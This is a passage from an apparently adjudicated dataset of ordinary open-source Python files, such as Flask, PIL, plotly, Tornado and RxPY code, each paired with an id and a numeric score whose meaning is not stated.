alarm_type=AlarmEventType.EQUIPTMENT,<<NEWL>>                                                alarm_severity=AlarmEventSeverity.CRITICAL)<<NEWL>>        self._onu_id = onu_id<<NEWL>>        self._intf_id = intf_id<<NEWL>><<NEWL>>    def get_context_data(self):<<NEWL>>        return {'onu-id': self._onu_id,<<NEWL>>                'onu-intf-id': self._intf_id}"
455	adjudicated	3	"# Copyright 2016 Google LLC.<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#     http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>><<NEWL>>from flask import Flask<<NEWL>>import requests<<NEWL>><<NEWL>>import services_config<<NEWL>><<NEWL>>app = Flask(__name__)<<NEWL>>services_config.init_app(app)<<NEWL>><<NEWL>><<NEWL>>@app.route('/')<<NEWL>>def root():<<NEWL>>    """"""Gets index.html from the static file server""""""<<NEWL>>    res = requests.get(app.config['SERVICE_MAP']['static'])<<NEWL>>    return res.content<<NEWL>><<NEWL>><<NEWL>>@app.route('/hello/<service>')<<NEWL>>def say_hello(service):<<NEWL>>    """"""Recieves requests from buttons on the front end and resopnds<<NEWL>>    or sends request to the static file server""""""<<NEWL>>    # If 'gateway' is specified return immediate<<NEWL>>    if service == 'gateway':<<NEWL>>        return 'Gateway says hello'<<NEWL>><<NEWL>>    # Otherwise send request to service indicated by URL param<<NEWL>>    responses = []<<NEWL>>    url = app.config['SERVICE_MAP'][service]<<NEWL>>    res = requests.get(url + '/hello')<<NEWL>>    responses.append(res.content)<<NEWL>>    return '\n'.encode().join(responses)<<NEWL>><<NEWL>><<NEWL>>@app.route('/<path>')<<NEWL>>def static_file(path):<<NEWL>>    """"""Gets static files required by index.html to static file server""""""<<NEWL>>    url = app.config['SERVICE_MAP']['static']<<NEWL>>    res = requests.get(url + '/' + path)<<NEWL>>    return res.content, 200, {'Content-Type': res.headers['Content-Type']}<<NEWL>><<NEWL>><<NEWL>>if __name__ == '__main__':<<NEWL>>    # This is used when running locally. Gunicorn is used to run the<<NEWL>>    # application on Google App Engine. See entrypoint in app.yaml.<<NEWL>>    app.run(host='127.0.0.1', port=8000, debug=True)"
515	adjudicated	0	"import sys<<NEWL>>from typing import TYPE_CHECKING<<NEWL>><<NEWL>>if sys.version_info < (3, 7) or TYPE_CHECKING:<<NEWL>>    from ._visible import VisibleValidator<<NEWL>>    from ._type import TypeValidator<<NEWL>>    from ._templateitemname import TemplateitemnameValidator<<NEWL>>    from ._symbol import SymbolValidator<<NEWL>>    from ._sourcetype import SourcetypeValidator<<NEWL>>    from ._sourcelayer import SourcelayerValidator<<NEWL>>    from ._sourceattribution import SourceattributionValidator<<NEWL>>    from ._source import SourceValidator<<NEWL>>    from ._opacity import OpacityValidator<<NEWL>>    from ._name import NameValidator<<NEWL>>    from ._minzoom import MinzoomValidator<<NEWL>>    from ._maxzoom import MaxzoomValidator<<NEWL>>    from ._line import LineValidator<<NEWL>>    from ._fill import FillValidator<<NEWL>>    from ._coordinates import CoordinatesValidator<<NEWL>>    from ._color import ColorValidator<<NEWL>>    from ._circle import CircleValidator<<NEWL>>    from ._below import BelowValidator<<NEWL>>else:<<NEWL>>    from _plotly_utils.importers import relative_import<<NEWL>><<NEWL>>    __all__, __getattr__, __dir__ = relative_import(<<NEWL>>        __name__,<<NEWL>>        [],<<NEWL>>        [<<NEWL>>            ""._visible.VisibleValidator"",<<NEWL>>            ""._type.TypeValidator"",<<NEWL>>            ""._templateitemname.TemplateitemnameValidator"",<<NEWL>>            ""._symbol.SymbolValidator"",<<NEWL>>            ""._sourcetype.SourcetypeValidator"",<<NEWL>>            ""._sourcelayer.SourcelayerValidator"",<<NEWL>>            ""._sourceattribution.SourceattributionValidator"",<<NEWL>>            ""._source.SourceValidator"",<<NEWL>>            ""._opacity.OpacityValidator"",<<NEWL>>            ""._name.NameValidator"",<<NEWL>>            ""._minzoom.MinzoomValidator"",<<NEWL>>            ""._maxzoom.MaxzoomValidator"",<<NEWL>>            ""._line.LineValidator"",<<NEWL>>            ""._fill.FillValidator"",<<NEWL>>            ""._coordinates.CoordinatesValidator"",<<NEWL>>            ""._color.ColorValidator"",<<NEWL>>            ""._circle.CircleValidator"",<<NEWL>>            ""._below.BelowValidator"",<<NEWL>>        ],<<NEWL>>    )"
404	adjudicated	3	"#<<NEWL>># The Python Imaging Library.<<NEWL>># $Id$<<NEWL>>#<<NEWL>># sequence support classes<<NEWL>>#<<NEWL>># history:<<NEWL>># 1997-02-20 fl     Created<<NEWL>>#<<NEWL>># Copyright (c) 1997 by Secret Labs AB.<<NEWL>># Copyright (c) 1997 by Fredrik Lundh.<<NEWL>>#<<NEWL>># See the README file for information on usage and redistribution.<<NEWL>>#<<NEWL>><<NEWL>>##<<NEWL>><<NEWL>><<NEWL>>class Iterator:<<NEWL>>    """"""<<NEWL>>    This class implements an iterator object that can be used to loop<<NEWL>>    over an image sequence.<<NEWL>><<NEWL>>    You can use the ``[]`` operator to access elements by index. This operator<<NEWL>>    will raise an :py:exc:`IndexError` if you try to access a nonexistent<<NEWL>>    frame.<<NEWL>><<NEWL>>    :param im: An image object.<<NEWL>>    """"""<<NEWL>><<NEWL>>    def __init__(self, im):<<NEWL>>        if not hasattr(im, ""seek""):<<NEWL>>            msg = ""im must have seek method""<<NEWL>>            raise AttributeError(msg)<<NEWL>>        self.im = im<<NEWL>>        self.position = getattr(self.im, ""_min_frame"", 0)<<NEWL>><<NEWL>>    def __getitem__(self, ix):<<NEWL>>        try:<<NEWL>>            self.im.seek(ix)<<NEWL>>            return self.im<<NEWL>>        except EOFError as e:<<NEWL>>            raise IndexError from e  # end of sequence<<NEWL>><<NEWL>>    def __iter__(self):<<NEWL>>        return self<<NEWL>><<NEWL>>    def __next__(self):<<NEWL>>        try:<<NEWL>>            self.im.seek(self.position)<<NEWL>>            self.position += 1<<NEWL>>            return self.im<<NEWL>>        except EOFError as e:<<NEWL>>            raise StopIteration from e<<NEWL>><<NEWL>><<NEWL>>def all_frames(im, func=None):<<NEWL>>    """"""<<NEWL>>    Applies a given function to all frames in an image or a list of images.<<NEWL>>    The frames are returned as a list of separate images.<<NEWL>><<NEWL>>    :param im: An image, or a list of images.<<NEWL>>    :param func: The function to apply to all of the image frames.<<NEWL>>    :returns: A list of images.<<NEWL>>    """"""<<NEWL>>    if not isinstance(im, list):<<NEWL>>        im = [im]<<NEWL>><<NEWL>>    ims = []<<NEWL>>    for imSequence in im:<<NEWL>>        current = imSequence.tell()<<NEWL>><<NEWL>>        ims += [im_frame.copy() for im_frame in Iterator(imSequence)]<<NEWL>><<NEWL>>        imSequence.seek(current)<<NEWL>>    return [func(im) for im in ims] if func else ims"
492	adjudicated	1	"#<<NEWL>># download_mks_assets.py<<NEWL>># Added by HAS_TFT_LVGL_UI to download assets from Makerbase repo<<NEWL>>#<<NEWL>>import pioutil<<NEWL>>if pioutil.is_pio_build():<<NEWL>>    Import(""env"")<<NEWL>>    import requests,zipfile,tempfile,shutil<<NEWL>>    from pathlib import Path<<NEWL>><<NEWL>>    url = ""https://github.com/makerbase-mks/Mks-Robin-Nano-Marlin2.0-Firmware/archive/0263cdaccf.zip""<<NEWL>>    deps_path = Path(env.Dictionary(""PROJECT_LIBDEPS_DIR""))<<NEWL>>    zip_path = deps_path / ""mks-assets.zip""<<NEWL>>    assets_path = Path(env.Dictionary(""PROJECT_BUILD_DIR""), env.Dictionary(""PIOENV""), ""assets"")<<NEWL>><<NEWL>>    def download_mks_assets():<<NEWL>>        print(""Downloading MKS Assets"")<<NEWL>>        r = requests.get(url, stream=True)<<NEWL>>        # the user may have a very clean workspace,<<NEWL>>        # so create the PROJECT_LIBDEPS_DIR directory if not exits<<NEWL>>        if not deps_path.exists():<<NEWL>>            deps_path.mkdir()<<NEWL>>        with zip_path.open('wb') as fd:<<NEWL>>            for chunk in r.iter_content(chunk_size=128):<<NEWL>>                fd.write(chunk)<<NEWL>><<NEWL>>    def copy_mks_assets():<<NEWL>>        print(""Copying MKS Assets"")<<NEWL>>        output_path = Path(tempfile.mkdtemp())<<NEWL>>        zip_obj = zipfile.ZipFile(zip_path, 'r')<<NEWL>>        zip_obj.extractall(output_path)<<NEWL>>        zip_obj.close()<<NEWL>>        if assets_path.exists() and not assets_path.is_dir():<<NEWL>>            assets_path.unlink()<<NEWL>>        if not assets_path.exists():<<NEWL>>            assets_path.mkdir()<<NEWL>>        base_path = ''<<NEWL>>        for filename in output_path.iterdir():<<NEWL>>            base_path = filename<<NEWL>>        fw_path = (output_path / base_path / 'Firmware')<<NEWL>>        font_path = fw_path / 'mks_font'<<NEWL>>        for filename in font_path.iterdir():<<NEWL>>            shutil.copy(font_path / filename, assets_path)<<NEWL>>        pic_path = fw_path / 'mks_pic'<<NEWL>>        for filename in pic_path.iterdir():<<NEWL>>            shutil.copy(pic_path / filename, assets_path)<<NEWL>>        shutil.rmtree(output_path, ignore_errors=True)<<NEWL>><<NEWL>>    if not zip_path.exists():<<NEWL>>        download_mks_assets()<<NEWL>><<NEWL>>    if not assets_path.exists():<<NEWL>>        copy_mks_assets()"
430	adjudicated	4	"import os<<NEWL>><<NEWL>>from _pydev_bundle import pydev_log<<NEWL>>from _pydevd_bundle.pydevd_trace_dispatch import USING_CYTHON<<NEWL>>from _pydevd_bundle.pydevd_constants import USE_CYTHON_FLAG, ENV_FALSE_LOWER_VALUES, \<<NEWL>>    ENV_TRUE_LOWER_VALUES, IS_PY36_OR_GREATER, IS_PY38_OR_GREATER, SUPPORT_GEVENT, IS_PYTHON_STACKLESS, \<<NEWL>>    PYDEVD_USE_FRAME_EVAL, PYDEVD_IPYTHON_COMPATIBLE_DEBUGGING<<NEWL>><<NEWL>>frame_eval_func = None<<NEWL>>stop_frame_eval = None<<NEWL>>dummy_trace_dispatch = None<<NEWL>>clear_thread_local_info = None<<NEWL>><<NEWL>># ""NO"" means we should not use frame evaluation, 'YES' we should use it (and fail if not there) and unspecified uses if possible.<<NEWL>>if (<<NEWL>>        PYDEVD_USE_FRAME_EVAL in ENV_FALSE_LOWER_VALUES or<<NEWL>>        USE_CYTHON_FLAG in ENV_FALSE_LOWER_VALUES or<<NEWL>>        not USING_CYTHON or<<NEWL>><<NEWL>>        # Frame eval mode does not work with ipython compatible debugging (this happens because the<<NEWL>>        # way that frame eval works is run untraced and set tracing only for the frames with<<NEWL>>        # breakpoints, but ipython compatible debugging creates separate frames for what's logically<<NEWL>>        # the same frame).<<NEWL>>        PYDEVD_IPYTHON_COMPATIBLE_DEBUGGING<<NEWL>>    ):<<NEWL>>    USING_FRAME_EVAL = False<<NEWL>><<NEWL>>elif SUPPORT_GEVENT or (IS_PYTHON_STACKLESS and not IS_PY38_OR_GREATER):<<NEWL>>    USING_FRAME_EVAL = False<<NEWL>>    # i.e gevent and frame eval mode don't get along very well.<<NEWL>>    # https://github.com/microsoft/debugpy/issues/189<<NEWL>>    # Same problem with Stackless.<<NEWL>>    # https://github.com/stackless-dev/stackless/issues/240<<NEWL>><<NEWL>>elif PYDEVD_USE_FRAME_EVAL in ENV_TRUE_LOWER_VALUES:<<NEWL>>    # Fail if unable to use<<NEWL>>    from _pydevd_frame_eval.pydevd_frame_eval_cython_wrapper import frame_eval_func, stop_frame_eval, dummy_trace_dispatch, clear_thread_local_info<<NEWL>>    USING_FRAME_EVAL = True<<NEWL>><<NEWL>>else:<<NEWL>>    USING_FRAME_EVAL = False<<NEWL>>    # Try to use if possible<<NEWL>>    if IS_PY36_OR_GREATER:<<NEWL>>        try:<<NEWL>>            from _pydevd_frame_eval.pydevd_frame_eval_cython_wrapper import frame_eval_func, stop_frame_eval, dummy_trace_dispatch, clear_thread_local_info<<NEWL>>            USING_FRAME_EVAL = True<<NEWL>>        except ImportError:<<NEWL>>            pydev_log.show_compile_cython_command_line()"
461	adjudicated	1	"#!/usr/bin/env python3<<NEWL>><<NEWL>># Copyright (c) 2012 Google Inc. All rights reserved.<<NEWL>># Use of this source code is governed by a BSD-style license that can be<<NEWL>># found in the LICENSE file.<<NEWL>><<NEWL>>"""""" Unit tests for the ninja.py file. """"""<<NEWL>><<NEWL>>import sys<<NEWL>>import unittest<<NEWL>><<NEWL>>import gyp.generator.ninja as ninja<<NEWL>><<NEWL>><<NEWL>>class TestPrefixesAndSuffixes(unittest.TestCase):<<NEWL>>    def test_BinaryNamesWindows(self):<<NEWL>>        # These cannot run on non-Windows as they require a VS installation to<<NEWL>>        # correctly handle variable expansion.<<NEWL>>        if sys.platform.startswith(""win""):<<NEWL>>            writer = ninja.NinjaWriter(<<NEWL>>                ""foo"", ""wee"", ""."", ""."", ""build.ninja"", ""."", ""build.ninja"", ""win""<<NEWL>>            )<<NEWL>>            spec = {""target_name"": ""wee""}<<NEWL>>            self.assertTrue(<<NEWL>>                writer.ComputeOutputFileName(spec, ""executable"").endswith("".exe"")<<NEWL>>            )<<NEWL>>            self.assertTrue(<<NEWL>>                writer.ComputeOutputFileName(spec, ""shared_library"").endswith("".dll"")<<NEWL>>            )<<NEWL>>            self.assertTrue(<<NEWL>>                writer.ComputeOutputFileName(spec, ""static_library"").endswith("".lib"")<<NEWL>>            )<<NEWL>><<NEWL>>    def test_BinaryNamesLinux(self):<<NEWL>>        writer = ninja.NinjaWriter(<<NEWL>>            ""foo"", ""wee"", ""."", ""."", ""build.ninja"", ""."", ""build.ninja"", ""linux""<<NEWL>>        )<<NEWL>>        spec = {""target_name"": ""wee""}<<NEWL>>        self.assertTrue(""."" not in writer.ComputeOutputFileName(spec, ""executable""))<<NEWL>>        self.assertTrue(<<NEWL>>            writer.ComputeOutputFileName(spec, ""shared_library"").startswith(""lib"")<<NEWL>>        )<<NEWL>>        self.assertTrue(<<NEWL>>            writer.ComputeOutputFileName(spec, ""static_library"").startswith(""lib"")<<NEWL>>        )<<NEWL>>        self.assertTrue(<<NEWL>>            writer.ComputeOutputFileName(spec, ""shared_library"").endswith("".so"")<<NEWL>>        )<<NEWL>>        self.assertTrue(<<NEWL>>            writer.ComputeOutputFileName(spec, ""static_library"").endswith("".a"")<<NEWL>>        )<<NEWL>><<NEWL>><<NEWL>>if __name__ == ""__main__"":<<NEWL>>    unittest.main()"
501	adjudicated	3	"#!/usr/bin/env python<<NEWL>><<NEWL>># Copyright 2019 Google LLC<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#     http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>>""""""<<NEWL>>command line application and sample code for destroying a secret version.<<NEWL>>""""""<<NEWL>><<NEWL>>import argparse<<NEWL>><<NEWL>><<NEWL>># [START secretmanager_destroy_secret_version]<<NEWL>>def destroy_secret_version(project_id, secret_id, version_id):<<NEWL>>    """"""<<NEWL>>    Destroy the given secret version, making the payload irrecoverable. Other<<NEWL>>    secrets versions are unaffected.<<NEWL>>    """"""<<NEWL>><<NEWL>>    # Import the Secret Manager client library.<<NEWL>>    from google.cloud import secretmanager<<NEWL>><<NEWL>>    # Create the Secret Manager client.<<NEWL>>    client = secretmanager.SecretManagerServiceClient()<<NEWL>><<NEWL>>    # Build the resource name of the secret version<<NEWL>>    name = f""projects/{project_id}/secrets/{secret_id}/versions/{version_id}""<<NEWL>><<NEWL>>    # Destroy the secret version.<<NEWL>>    response = client.destroy_secret_version(request={""name"": name})<<NEWL>><<NEWL>>    print(""Destroyed secret version: {}"".format(response.name))<<NEWL>>    # [END secretmanager_destroy_secret_version]<<NEWL>><<NEWL>>    return response<<NEWL>><<NEWL>><<NEWL>>if __name__ == ""__main__"":<<NEWL>>    parser = argparse.ArgumentParser(<<NEWL>>        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter<<NEWL>>    )<<NEWL>>    parser.add_argument(""project_id"", help=""id of the GCP project"")<<NEWL>>    parser.add_argument(""secret_id"", help=""id of the secret from which to act"")<<NEWL>>    parser.add_argument(""version_id"", help=""id of the version to destroy"")<<NEWL>>    args = parser.parse_args()<<NEWL>><<NEWL>>    destroy_secret_version(args.project_id, args.secret_id, args.version_id)"
441	adjudicated	4	"""""""<<NEWL>>PostGIS to GDAL conversion constant definitions<<NEWL>>""""""<<NEWL>># Lookup to convert pixel type values from GDAL to PostGIS<<NEWL>>GDAL_TO_POSTGIS = [None, 4, 6, 5, 8, 7, 10, 11, None, None, None, None]<<NEWL>><<NEWL>># Lookup to convert pixel type values from PostGIS to GDAL<<NEWL>>POSTGIS_TO_GDAL = [1, 1, 1, 3, 1, 3, 2, 5, 4, None, 6, 7, None, None]<<NEWL>><<NEWL>># Struct pack structure for raster header, the raster header has the<<NEWL>># following structure:<<NEWL>>#<<NEWL>># Endianness, PostGIS raster version, number of bands, scale, origin,<<NEWL>># skew, srid, width, and height.<<NEWL>>#<<NEWL>># Scale, origin, and skew have x and y values. PostGIS currently uses<<NEWL>># a fixed endianness (1) and there is only one version (0).<<NEWL>>POSTGIS_HEADER_STRUCTURE = ""B H H d d d d d d i H H""<<NEWL>><<NEWL>># Lookup values to convert GDAL pixel types to struct characters. This is<<NEWL>># used to pack and unpack the pixel values of PostGIS raster bands.<<NEWL>>GDAL_TO_STRUCT = [<<NEWL>>    None,<<NEWL>>    ""B"",<<NEWL>>    ""H"",<<NEWL>>    ""h"",<<NEWL>>    ""L"",<<NEWL>>    ""l"",<<NEWL>>    ""f"",<<NEWL>>    ""d"",<<NEWL>>    None,<<NEWL>>    None,<<NEWL>>    None,<<NEWL>>    None,<<NEWL>>]<<NEWL>><<NEWL>># Size of the packed value in bytes for different numerical types.<<NEWL>># This is needed to cut chunks of band data out of PostGIS raster strings<<NEWL>># when decomposing them into GDALRasters.<<NEWL>># See https://docs.python.org/library/struct.html#format-characters<<NEWL>>STRUCT_SIZE = {<<NEWL>>    ""b"": 1,  # Signed char<<NEWL>>    ""B"": 1,  # Unsigned char<<NEWL>>    ""?"": 1,  # _Bool<<NEWL>>    ""h"": 2,  # Short<<NEWL>>    ""H"": 2,  # Unsigned short<<NEWL>>    ""i"": 4,  # Integer<<NEWL>>    ""I"": 4,  # Unsigned Integer<<NEWL>>    ""l"": 4,  # Long<<NEWL>>    ""L"": 4,  # Unsigned Long<<NEWL>>    ""f"": 4,  # Float<<NEWL>>    ""d"": 8,  # Double<<NEWL>>}<<NEWL>><<NEWL>># Pixel type specifies type of pixel values in a band. Storage flag specifies<<NEWL>># whether the band data is stored as part of the datum or is to be found on the<<NEWL>># server's filesystem. There are currently 11 supported pixel value types, so 4<<NEWL>># bits are enough to account for all. Reserve the upper 4 bits for generic<<NEWL>># flags. See<<NEWL>># https://trac.osgeo.org/postgis/wiki/WKTRaster/RFC/RFC1_V0SerialFormat#Pixeltypeandstorageflag<<NEWL>>BANDTYPE_PIXTYPE_MASK = 0x0F<<NEWL>>BANDTYPE_FLAG_HASNODATA = 1 << 6"
410	adjudicated	1	"# -*- coding: utf-8 -*-<<NEWL>># Generated by the protocol buffer compiler.  DO NOT EDIT!<<NEWL>># source: streamlit/proto/Spinner.proto<<NEWL>><<NEWL>>from google.protobuf import descriptor as _descriptor<<NEWL>>from google.protobuf import message as _message<<NEWL>>from google.protobuf import reflection as _reflection<<NEWL>>from google.protobuf import symbol_database as _symbol_database<<NEWL>># @@protoc_insertion_point(imports)<<NEWL>><<NEWL>>_sym_db = _symbol_database.Default()<<NEWL>><<NEWL>><<NEWL>><<NEWL>><<NEWL>>DESCRIPTOR = _descriptor.FileDescriptor(<<NEWL>>  name='streamlit/proto/Spinner.proto',<<NEWL>>  package='',<<NEWL>>  syntax='proto3',<<NEWL>>  serialized_options=None,<<NEWL>>  create_key=_descriptor._internal_create_key,<<NEWL>>  serialized_pb=b'\n\x1dstreamlit/proto/Spinner.proto\""\x17\n\x07Spinner\x12\x0c\n\x04text\x18\x01 \x01(\tb\x06proto3'<<NEWL>>)<<NEWL>><<NEWL>><<NEWL>><<NEWL>><<NEWL>>_SPINNER = _descriptor.Descriptor(<<NEWL>>  name='Spinner',<<NEWL>>  full_name='Spinner',<<NEWL>>  filename=None,<<NEWL>>  file=DESCRIPTOR,<<NEWL>>  containing_type=None,<<NEWL>>  create_key=_descriptor._internal_create_key,<<NEWL>>  fields=[<<NEWL>>    _descriptor.FieldDescriptor(<<NEWL>>      name='text', full_name='Spinner.text', index=0,<<NEWL>>      number=1, type=9, cpp_type=9, label=1,<<NEWL>>      has_default_value=False, default_value=b"""".decode('utf-8'),<<NEWL>>      message_type=None, enum_type=None, containing_type=None,<<NEWL>>      is_extension=False, extension_scope=None,<<NEWL>>      serialized_options=None, file=DESCRIPTOR,  create_key=_descriptor._internal_create_key),<<NEWL>>  ],<<NEWL>>  extensions=[<<NEWL>>  ],<<NEWL>>  nested_types=[],<<NEWL>>  enum_types=[<<NEWL>>  ],<<NEWL>>  serialized_options=None,<<NEWL>>  is_extendable=False,<<NEWL>>  syntax='proto3',<<NEWL>>  extension_ranges=[],<<NEWL>>  oneofs=[<<NEWL>>  ],<<NEWL>>  serialized_start=33,<<NEWL>>  serialized_end=56,<<NEWL>>)<<NEWL>><<NEWL>>DESCRIPTOR.message_types_by_name['Spinner'] = _SPINNER<<NEWL>>_sym_db.RegisterFileDescriptor(DESCRIPTOR)<<NEWL>><<NEWL>>Spinner = _reflection.GeneratedProtocolMessageType('Spinner', (_message.Message,), {<<NEWL>>  'DESCRIPTOR' : _SPINNER,<<NEWL>>  '__module__' : 'streamlit.proto.Spinner_pb2'<<NEWL>>  # @@protoc_insertion_point(class_scope:Spinner)<<NEWL>>  })<<NEWL>>_sym_db.RegisterMessage(Spinner)<<NEWL>><<NEWL>><<NEWL>># @@protoc_insertion_point(module_scope)"
424	adjudicated	1	"""""""Test markdown rendering""""""<<NEWL>><<NEWL>><<NEWL>>from nbformat.v4 import new_markdown_cell<<NEWL>><<NEWL>>from .utils import EDITOR_PAGE<<NEWL>><<NEWL>><<NEWL>>def get_rendered_contents(nb):<<NEWL>>    # TODO: Encapsulate element access/refactor so we're not accessing playwright element objects<<NEWL>>    cl = [""text_cell"", ""render""]<<NEWL>>    rendered_cells = [cell.locate("".text_cell_render"")<<NEWL>>                      for cell in nb.cells<<NEWL>>                      if all([c in cell.get_attribute(""class"") for c in cl])]<<NEWL>>    return [x.get_inner_html().strip()<<NEWL>>            for x in rendered_cells<<NEWL>>            if x is not None]<<NEWL>><<NEWL>><<NEWL>>def test_markdown_cell(prefill_notebook):<<NEWL>>    notebook_frontend = prefill_notebook([new_markdown_cell(md) for md in [<<NEWL>>        '# Foo', '**Bar**', '*Baz*', '```\nx = 1\n```', '```aaaa\nx = 1\n```',<<NEWL>>        '```python\ns = ""$""\nt = ""$""\n```'<<NEWL>>    ]])<<NEWL>><<NEWL>>    assert get_rendered_contents(notebook_frontend) == [<<NEWL>>        '<h1 id=""Foo"">Foo<a class=""anchor-link"" href=""#Foo"">¶</a></h1>',<<NEWL>>        '<p><strong>Bar</strong></p>',<<NEWL>>        '<p><em>Baz</em></p>',<<NEWL>>        '<pre><code>x = 1</code></pre>',<<NEWL>>        '<pre><code class=""cm-s-ipython language-aaaa"">x = 1</code></pre>',<<NEWL>>        '<pre><code class=""cm-s-ipython language-python"">' +<<NEWL>>        '<span class=""cm-variable"">s</span> <span class=""cm-operator"">=</span> <span class=""cm-string"">""$""</span>\n' +<<NEWL>>        '<span class=""cm-variable"">t</span> <span class=""cm-operator"">=</span> <span class=""cm-string"">""$""</span></code></pre>'<<NEWL>>    ]<<NEWL>><<NEWL>><<NEWL>>def test_markdown_headings(notebook_frontend):<<NEWL>>    for i in [1, 2, 3, 4, 5, 6, 2, 1]:<<NEWL>>        notebook_frontend.add_markdown_cell()<<NEWL>>        cell_text = notebook_frontend.evaluate(f""""""<<NEWL>>            var cell = IPython.notebook.get_cell(1);<<NEWL>>            cell.set_heading_level({i});<<NEWL>>            cell.get_text();<<NEWL>>        """""", page=EDITOR_PAGE)<<NEWL>>        assert notebook_frontend.get_cell_contents(1) == ""#"" * i + "" ""<<NEWL>>        notebook_frontend.delete_cell(1)"
475	adjudicated	1	from rx.core import ObservableBase, Observer, AnonymousObserver, Disposable<<NEWL>>from rx.disposables import CompositeDisposable<<NEWL>><<NEWL>>from .subscription import Subscription<<NEWL>>from .reactive_assert import AssertList<<NEWL>><<NEWL>><<NEWL>>class ColdObservable(ObservableBase):<<NEWL>>    def __init__(self, scheduler, messages):<<NEWL>>        super(ColdObservable, self).__init__()<<NEWL>><<NEWL>>        self.scheduler = scheduler<<NEWL>>        self.messages = messages<<NEWL>>        self.subscriptions = AssertList()<<NEWL>><<NEWL>>    def subscribe(self, on_next=None, on_error=None, on_completed=None, observer=None):<<NEWL>>        # Be forgiving and accept an un-named observer as first parameter<<NEWL>>        if isinstance(on_next, Observer):<<NEWL>>            observer = on_next<<NEWL>>        elif not observer:<<NEWL>>            observer = AnonymousObserver(on_next, on_error, on_completed)<<NEWL>><<NEWL>>        return self._subscribe_core(observer)<<NEWL>><<NEWL>>    def _subscribe_core(self, observer):<<NEWL>>        clock = self.scheduler.to_relative(self.scheduler.now)<<NEWL>>        self.subscriptions.append(Subscription(clock))<<NEWL>>        index = len(self.subscriptions) - 1<<NEWL>>        disposable = CompositeDisposable()<<NEWL>><<NEWL>>        def get_action(notification):<<NEWL>>            def action(scheduler, state):<<NEWL>>                notification.accept(observer)<<NEWL>>                return Disposable.empty()<<NEWL>>            return action<<NEWL>><<NEWL>>        for message in self.messages:<<NEWL>>            notification = message.value<<NEWL>><<NEWL>>            # Don't make closures within a loop<<NEWL>>            action = get_action(notification)<<NEWL>>            disposable.add(self.scheduler.schedule_relative(message.time, action))<<NEWL>><<NEWL>>        def dispose():<<NEWL>>            start = self.subscriptions[index].subscribe<<NEWL>>            end = self.scheduler.to_relative(self.scheduler.now)<<NEWL>>            self.subscriptions[index] = Subscription(start, end)<<NEWL>>            disposable.dispose()<<NEWL>><<NEWL>>        return Disposable.create(dispose)
486	adjudicated	1	"import socket<<NEWL>>import typing<<NEWL>><<NEWL>>from tornado.http1connection import HTTP1Connection<<NEWL>>from tornado.httputil import HTTPMessageDelegate<<NEWL>>from tornado.iostream import IOStream<<NEWL>>from tornado.locks import Event<<NEWL>>from tornado.netutil import add_accept_handler<<NEWL>>from tornado.testing import AsyncTestCase, bind_unused_port, gen_test<<NEWL>><<NEWL>><<NEWL>>class HTTP1ConnectionTest(AsyncTestCase):<<NEWL>>    code = None  # type: typing.Optional[int]<<NEWL>><<NEWL>>    def setUp(self):<<NEWL>>        super().setUp()<<NEWL>>        self.asyncSetUp()<<NEWL>><<NEWL>>    @gen_test<<NEWL>>    def asyncSetUp(self):<<NEWL>>        listener, port = bind_unused_port()<<NEWL>>        event = Event()<<NEWL>><<NEWL>>        def accept_callback(conn, addr):<<NEWL>>            self.server_stream = IOStream(conn)<<NEWL>>            self.addCleanup(self.server_stream.close)<<NEWL>>            event.set()<<NEWL>><<NEWL>>        add_accept_handler(listener, accept_callback)<<NEWL>>        self.client_stream = IOStream(socket.socket())<<NEWL>>        self.addCleanup(self.client_stream.close)<<NEWL>>        yield [self.client_stream.connect((""127.0.0.1"", port)), event.wait()]<<NEWL>>        self.io_loop.remove_handler(listener)<<NEWL>>        listener.close()<<NEWL>><<NEWL>>    @gen_test<<NEWL>>    def test_http10_no_content_length(self):<<NEWL>>        # Regression test for a bug in which can_keep_alive would crash<<NEWL>>        # for an HTTP/1.0 (not 1.1) response with no content-length.<<NEWL>>        conn = HTTP1Connection(self.client_stream, True)<<NEWL>>        self.server_stream.write(b""HTTP/1.0 200 Not Modified\r\n\r\nhello"")<<NEWL>>        self.server_stream.close()<<NEWL>><<NEWL>>        event = Event()<<NEWL>>        test = self<<NEWL>>        body = []<<NEWL>><<NEWL>>        class Delegate(HTTPMessageDelegate):<<NEWL>>            def headers_received(self, start_line, headers):<<NEWL>>                test.code = start_line.code<<NEWL>><<NEWL>>            def data_received(self, data):<<NEWL>>                body.append(data)<<NEWL>><<NEWL>>            def finish(self):<<NEWL>>                event.set()<<NEWL>><<NEWL>>        yield conn.read_response(Delegate())<<NEWL>>        yield event.wait()<<NEWL>>        self.assertEqual(self.code, 200)<<NEWL>>        self.assertEqual(b"""".join(body), b""hello"")"
